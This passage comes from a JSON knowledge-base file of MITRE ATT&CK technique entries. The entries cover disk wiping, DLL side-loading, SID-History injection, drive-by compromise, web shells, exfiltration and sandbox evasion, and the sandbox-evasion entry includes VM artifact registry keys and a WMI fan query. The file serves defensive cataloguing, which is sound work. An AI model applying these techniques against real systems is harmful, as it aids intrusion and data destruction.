      "description": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1042) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
      "meta": {
        "external_id": "T1494",
        "kill_chain": [
          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1494",
          "https://content.fireeye.com/apt/rpt-apt38",
          "https://www.justice.gov/opa/press-release/file/1092091/download"
        ]
      },
      "uuid": "ca205a36-c1ad-488b-aa6c-ab34bdd3a36b",
      "value": "Runtime Data Manipulation - T1494"
    },
    {
      "description": "A message sent over a radio interface (typically cellular, but potentially Bluetooth, GPS, NFC, Wi-Fi or other) to the mobile device could exploit a vulnerability in code running on the device.\n\nD. Komaromy and N. Golde demonstrated baseband exploitation of a Samsung mobile device at the PacSec 2015 security conference (Citation: Register-BaseStation).\n\nWeinmann described and demonstrated \"the risk of remotely exploitable memory corruptions in cellular baseband stacks.\" (Citation: Weinmann-Baseband)\n\nPlatforms: Android, iOS",
      "meta": {
        "external_id": "T1455",
        "refs": [
          "https://attack.mitre.org/techniques/T1455"
        ]
      },
      "related": [
        {
          "dest-uuid": "2d646840-f6f5-4619-a5a8-29c8316bbac5",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "revoked-by"
        }
      ],
      "uuid": "c91c304a-975d-4501-9789-0db1c57afd3f",
      "value": "Exploit Baseband Vulnerability - T1455"
    },
    {
      "description": "Content of a media (audio or video) file could be designed to exploit vulnerabilities in parsers on the mobile device, as for example demonstrated by the Android Stagefright vulnerability (Citation: Zimperium-Stagefright).\n\nPlatforms: Android, iOS",
      "meta": {
        "external_id": "T1457",
        "refs": [
          "https://attack.mitre.org/techniques/T1457"
        ]
      },
      "related": [
        {
          "dest-uuid": "fd339382-bfec-4bf0-8d47-1caedc9e7e57",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "revoked-by"
        }
      ],
      "uuid": "a9cab8f6-4c94-4c9b-9e7d-9d863ff53431",
      "value": "Malicious Media Content - T1457"
    },
    {
      "description": "Adversaries may corrupt or wipe the disk data structures on hard drive necessary to boot systems; targeting specific critical systems as well as a large number of systems in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1487) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1488) if all sectors of a disk are wiped.\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
      "meta": {
        "external_id": "T1487",
        "kill_chain": [
          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "Kernel drivers",
          "MBR"
        ],
        "mitre_platforms": [
          "Windows",
          "macOS",
          "Linux"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1487",
          "https://www.symantec.com/connect/blogs/shamoon-attacks",
          "https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html",
          "http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/",
          "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf",
          "https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/"
        ]
      },
      "uuid": "2e114e45-2c50-404c-804a-3af9564d240e",
      "value": "Disk Structure Wipe - T1487"
    },
    {
      "description": "Adversaries may erase the contents of storage devices on specific systems as well as large numbers of systems in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Novetta Blockbuster Destructive Malware)",
      "meta": {
        "external_id": "T1488",
        "kill_chain": [
          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "Kernel drivers",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1488",
          "https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf",
          "https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf",
          "https://www.justice.gov/opa/press-release/file/1092091/download"
        ]
      },
      "uuid": "b82f7d37-b826-4ec9-9391-8e121c78aed7",
      "value": "Disk Content Wipe - T1488"
    },
    {
      "description": "A payload is the part of the malware which performs a malicious action. The adversary may re-use payloads when the needed capability is already available. (Citation: SonyDestover)",
      "meta": {
        "external_id": "T1346",
        "kill_chain": [
          "mitre-pre-attack:build-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1346"
        ]
      },
      "uuid": "27f3ddf8-1b77-4cc2-a4c0-e6da3d31a768",
      "value": "Obtain/re-use payloads - T1346"
    },
    {
      "description": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.",
      "meta": {
        "external_id": "T1104",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Netflow/Enclave netflow",
          "Network device logs",
          "Network protocol analysis",
          "Packet capture",
          "Process use of network"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1104"
        ]
      },
      "uuid": "84e02621-8fdf-470f-bd58-993bb6a89d91",
      "value": "Multi-Stage Channels - T1104"
    },
    {
      "description": "Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.). If an adversary gains access to these systems, then they may be able to execute code.\n\nAdversaries may gain access to and use third-party systems installed within an enterprise network, such as administration, monitoring, and deployment systems as well as third-party gateways and jump servers used for managing other systems. Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.",
      "meta": {
        "external_id": "T1072",
        "kill_chain": [
          "mitre-attack:execution",
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Third-party application logs",
          "Windows Registry",
          "Process monitoring",
          "Process use of network",
          "Binary file metadata"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1072"
        ]
      },
      "uuid": "92a78814-b191-47ca-909c-1ccfe3777414",
      "value": "Third-party Software - T1072"
    },
    {
      "description": "Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: MSDN Manifests) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable to side-loading to load a malicious DLL. (Citation: Stewart 2014)\n\nAdversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.",
      "meta": {
        "external_id": "CAPEC-641",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Process use of network",
          "Process monitoring",
          "Loaded DLLs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1073",
          "https://capec.mitre.org/data/definitions/641.html",
          "https://msdn.microsoft.com/en-us/library/aa375365",
          "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf"
        ]
      },
      "uuid": "b2001907-166b-4d71-bb3c-9d26c871de09",
      "value": "DLL Side-Loading - T1073"
    },
    {
      "description": "Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is [cmd](https://attack.mitre.org/software/S0106), which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [Scheduled Task](https://attack.mitre.org/techniques/T1053)).\n\nAdversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.",
      "meta": {
        "external_id": "T1059",
        "kill_chain": [
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1059",
          "https://en.wikipedia.org/wiki/Command-line_interface"
        ]
      },
      "uuid": "7385dfaf-6886-4229-9ecd-6fd678040830",
      "value": "Command-Line Interface - T1059"
    },
    {
      "description": "Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user reboots their machine. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at <code>~/Library/Preferences/com.apple.loginwindow.plist</code> and <code>~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist</code>. \n\nAn adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine (Citation: Methods of Mac Malware Persistence).",
      "meta": {
        "external_id": "T1164",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "File monitoring"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1164",
          "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf"
        ]
      },
      "uuid": "6a3be63a-64c5-4678-a036-03ff8fc35300",
      "value": "Re-opened Applications - T1164"
    },
    {
      "description": "The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nAdversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077), or [Windows Remote Management](https://attack.mitre.org/techniques/T1028).",
      "meta": {
        "external_id": "T1178",
        "kill_chain": [
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Authentication logs",
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1178",
          "https://msdn.microsoft.com/library/windows/desktop/aa379571.aspx",
          "https://msdn.microsoft.com/library/ms679833.aspx",
          "https://support.microsoft.com/help/243330/well-known-security-identifiers-in-windows-operating-systems",
          "https://technet.microsoft.com/library/ee617241.aspx",
          "https://adsecurity.org/?p=1772",
          "https://msdn.microsoft.com/library/ms677982.aspx"
        ]
      },
      "uuid": "1df0326d-2fbc-4d08-a16b-48365f1e742d",
      "value": "SID-History Injection - T1178"
    },
    {
      "description": "To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.",
      "meta": {
        "external_id": "T1188",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Network protocol analysis",
          "Netflow/Enclave netflow"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1188"
        ]
      },
      "uuid": "7d751199-05fa-4a72-920f-85df4506c76c",
      "value": "Multi-hop Proxy - T1188"
    },
    {
      "description": "A drive-by compromise is when an adversary gains access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring application access tokens.\n\nMultiple ways of delivering exploit code to a browser exist, including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.\n* Malicious ads are paid for and served through legitimate ad providers.\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring. (Citation: Shadowserver Strategic Web Compromise)\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)",
      "meta": {
        "external_id": "T1189",
        "kill_chain": [
          "mitre-attack:initial-access"
        ],
        "mitre_data_sources": [
          "Packet capture",
          "Network device logs",
          "Process use of network",
          "Web proxy",
          "Network intrusion detection system",
          "SSL/TLS inspection"
        ],
        "mitre_platforms": [
          "Windows",
          "Linux",
          "macOS",
          "SaaS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1189",
          "http://blog.shadowserver.org/2012/05/15/cyber-espionage-strategic-web-compromises-trusted-websites-serving-dangerous-results/",
          "https://www.volexity.com/blog/2017/11/06/oceanlotus-blossoms-mass-digital-surveillance-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society/"
        ]
      },
      "uuid": "d742a578-d70e-4d0e-96a6-02a9c30204e6",
      "value": "Drive-by Compromise - T1189"
    },
    {
      "description": "As described by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), a drive-by compromise is when an adversary gains access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is targeted for exploitation. For example, a website may contain malicious media content intended to exploit vulnerabilities in media parsers as demonstrated by the Android Stagefright vulnerability  (Citation: Zimperium-Stagefright).\n\n(This technique was formerly known as Malicious Web Content. It has been renamed to better align with ATT&CK for Enterprise.)",
      "meta": {
        "external_id": "CEL-22",
        "kill_chain": [
          "mitre-mobile-attack:initial-access"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1456",
          "https://pages.nist.gov/mobile-threat-catalogue/cellular-threats/CEL-22.html",
          "https://blog.zimperium.com/experts-found-a-unicorn-in-the-heart-of-android/"
        ]
      },
      "uuid": "fd339382-bfec-4bf0-8d47-1caedc9e7e57",
      "value": "Drive-by Compromise - T1456"
    },
    {
      "description": "Personnel internally to a company may belong to a group or maintain a role with  electronic specialized access, authorities, or privilege that make them an attractive target for an adversary.  One example of this is a system administrator. (Citation: RSA-APTRecon)",
      "meta": {
        "external_id": "T1270",
        "kill_chain": [
          "mitre-pre-attack:people-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1270"
        ]
      },
      "uuid": "89a79d91-53e0-4ef5-ba28-558cb8b01f76",
      "value": "Identify groups/roles - T1270"
    },
    {
      "description": "Proxies act as an intermediary for clients seeking resources from other systems. Using a proxy may make it more difficult to track back the origin of a network communication. (Citation: APT1)",
      "meta": {
        "external_id": "T1304",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1304"
        ]
      },
      "uuid": "b14f6692-b613-44bb-9f30-8381a5ff10d5",
      "value": "Proxy/protocol relays - T1304"
    },
    {
      "description": "Leadership derives Key Intelligence Topics (KITs) and Key Intelligence Questions (KIQs) from the areas of most interest to them.  KITs are an expression of management's intelligence needs with respect to early warning, strategic and operational decisions, knowing the competition, and understanding the competitive situation. KIQs are the critical questions aligned by KIT which provide the basis for collection plans, create a context for analytic work, and/or identify necessary external operations. (Citation: Herring1999)",
      "meta": {
        "external_id": "T1227",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-planning"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1227"
        ]
      },
      "uuid": "6063b486-a247-499b-976a-9de16f4e83bc",
      "value": "Develop KITs/KIQs - T1227"
    },
    {
      "description": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer.(Citation: Microsoft Shutdown Oct 2017) Shutting down or rebooting systems may disrupt access to computer resources for legitimate users.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1487) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)",
      "meta": {
        "external_id": "T1529",
        "kill_chain": [
          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "Windows event logs",
          "Process command-line parameters",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1529",
          "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown",
          "https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html",
          "https://blog.talosintelligence.com/2018/02/olympic-destroyer.html"
        ]
      },
      "uuid": "ff73aa03-0090-4464-83ac-f89e233c02bc",
      "value": "System Shutdown/Reboot - T1529"
    },
    {
      "description": "Adversaries may check for the presence of a virtual machine environment (VME) or sandbox to avoid potential detection of tools and activities. If the adversary detects a VME, they may alter their malware to conceal the core functions of the implant or disengage from the victim. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information from learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.\n\nAdversaries may use several methods including [Security Software Discovery](https://attack.mitre.org/techniques/T1063) to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) by searching for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) to help determine if it is an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandboxes. (Citation: Unit 42 Pirpi July 2015)\n\n###Virtual Machine Environment Artifacts Discovery###\n\nAdversaries may use utilities such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1086), [Systeminfo](https://attack.mitre.org/software/S0096), and the [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, and/or the Registry. Adversaries may use [Scripting](https://attack.mitre.org/techniques/T1064) to combine these checks into one script and then have the program exit if it determines the system to be a virtual environment. Also, in applications like VMWare, adversaries can use a special I/O port to send commands and receive output. Adversaries may also check the drive size. For example, this can be done using the Win32 DeviceIOControl function. \n\nExample VME Artifacts in the Registry(Citation: McAfee Virtual Jan 2017)\n\n* <code>HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions</code>\n* <code>HKLM\\HARDWARE\\Description\\System\\”SystemBiosVersion”;”VMWARE”</code>\n* <code>HKLM\\HARDWARE\\ACPI\\DSDT\\BOX_</code>\n\nExample VME files and DLLs on the system(Citation: McAfee Virtual Jan 2017)\n\n* <code>WINDOWS\\system32\\drivers\\vmmouse.sys</code> \n* <code>WINDOWS\\system32\\vboxhook.dll</code>\n* <code>Windows\\system32\\vboxdisp.dll</code>\n\nCommon checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017)\n\n###User Activity Discovery###\n\nAdversaries may search for user activity on the host (e.g., browser history, cache, bookmarks, number of files in the home directories, etc.) for reassurance of an authentic environment. They might detect this type of information via user interaction and digital signatures. They may have malware check the speed and frequency of mouse clicks to determine if it’s a sandboxed environment.(Citation: Sans Virtual Jan 2016) Other methods may rely on specific user interaction with the system before the malicious code is activated. Examples include waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) and waiting for a user to double click on an embedded image to activate (Citation: FireEye FIN7 April 2017).\n\n###Virtual Hardware Fingerprinting Discovery###\n\nAdversaries may check the fan and temperature of the system to gather evidence that can be indicative a virtual environment. An adversary may perform a CPU check using a WMI query <code>$q = “Select * from Win32_Fan” Get-WmiObject -Query $q</code>. If the results of the WMI query return more than zero elements, this might tell them that the machine is a physical one. (Citation: Unit 42 OilRig Sept 2018)",
      "meta": {
        "external_id": "T1497",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1497",
          "https://unit42.paloaltonetworks.com/ups-observations-on-cve-2015-3113-prior-zero-days-and-the-pirpi-payload/",
          "https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/stopping-malware-fake-virtual-machine/",
          "https://www.sans.org/reading-room/whitepapers/forensics/detecting-malware-sandbox-evasion-techniques-36667",
          "https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/",
          "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html",
          "https://researchcenter.paloaltonetworks.com/2018/09/unit42-oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie/"
        ]
      },
      "uuid": "82caa33e-d11a-433a-94ea-9b5a5fbef81d",
      "value": "Virtualization/Sandbox Evasion - T1497"
    },
    {
      "description": "Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, commingling legitimate traffic with C2 communications traffic, or using a non-standard data encoding system, such as a modified Base64 encoding for the message body of an HTTP request.",
      "meta": {
        "external_id": "T1001",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Packet capture",
          "Process use of network",
          "Process monitoring",
          "Network protocol analysis"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1001",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "ad255bfe-a9e6-4b52-a258-8d3462abe842",
      "value": "Data Obfuscation - T1001"
    },
    {
      "description": "A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)\n\nWeb shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.",
      "meta": {
        "external_id": "CAPEC-650",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "Anti-virus",
          "Authentication logs",
          "File monitoring",
          "Netflow/Enclave netflow",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1100",
          "https://capec.mitre.org/data/definitions/650.html",
          "https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html",
          "https://www.us-cert.gov/ncas/alerts/TA15-314A"
        ]
      },
      "uuid": "c16e5409-ee53-4d79-afdc-4099dc9292df",
      "value": "Web Shell - T1100"
    },
    {
      "description": "Data, such as sensitive documents, may be exfiltrated through the use of automated processing or [Scripting](https://attack.mitre.org/techniques/T1064) after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over Command and Control Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
      "meta": {
        "external_id": "T1020",
        "kill_chain": [
          "mitre-attack:exfiltration"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process use of network"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1020"
        ]
      },
      "uuid": "774a3188-6ba9-4dc4-879d-d54ee48a5ce9",
      "value": "Automated Exfiltration - T1020"
    },
    {
      "description": "Adversaries may introduce computer accessories, computers, or networking hardware into a system or network that can be used as a vector to gain access. While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access. Commercial and open source products are leveraged with capabilities such as passive network tapping (Citation: Ossmann Star Feb 2011), man-in-the middle encryption breaking (Citation: Aleks Weapons Nov 2015), keystroke injection (Citation: Hak5 RubberDuck Dec 2016), kernel memory reading via DMA (Citation: Frisk DMA August 2016), adding new wireless access to an existing network (Citation: McMillan Pwn March 2012), and others.",
      "meta": {
        "external_id": "T1200",
        "kill_chain": [
          "mitre-attack:initial-access"
        ],
        "mitre_data_sources": [
          "Asset management",
          "Data loss prevention"
        ],
        "mitre_platforms": [
          "Windows",
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1200",
          "https://ossmann.blogspot.com/2011/02/throwing-star-lan-tap.html",
          "http://www.bsidesto.ca/2015/slides/Weapons_of_a_Penetration_Tester.pptx",
          "https://www.hak5.org/blog/main-blog/stealing-files-with-the-usb-rubber-ducky-usb-exfiltration-explained",
          "https://www.youtube.com/watch?v=fXthwl6ShOg",
          "https://arstechnica.com/information-technology/2012/03/the-pwn-plug-is-a-little-white-box-that-can-hack-your-network/"
        ]
      },
      "uuid": "d40239b3-05ff-46d8-9bdd-b46d13463ef9",
      "value": "Hardware Additions - T1200"
    },
    {
      "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.",
      "meta": {
        "external_id": "T1002",
        "kill_chain": [
